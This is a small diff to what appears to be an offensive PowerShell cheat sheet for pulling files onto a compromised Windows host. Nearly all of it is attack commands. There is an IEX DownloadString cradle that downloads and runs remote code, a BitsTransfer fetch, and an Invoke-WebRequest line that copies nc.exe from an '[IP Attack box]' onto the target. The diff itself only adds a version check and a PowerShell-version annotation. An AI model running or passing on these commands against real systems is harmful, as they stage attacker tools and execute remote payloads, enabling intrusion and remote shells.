@@ -1,3 +1,6 @@
+# Check version
+powershell $PSVersionTable.PSVersion
+
 # Powershell Fetch Remote File
 powershell "IEX(New-Object Net.WebClient).DownloadString('http://host:port/file')"
 
@@ -6,6 +9,6 @@ powershell "IEX(New-Object Net.WebClient).DownloadString('http://host:port/file'
 # Does not rely on IE
 powershell Import-Module BitsTransfer;Start-BitsTransfer -Source http://host:port/file -Destination C:\
 
-# WebRequest
+# WebRequest - PS >= 3.0
 # Heavy memory and performance impact - LAST RESORT
 powershell Invoke-WebRequest -Uri http://[IP Attack box]/nc.exe -OutFile C:\nc.exe
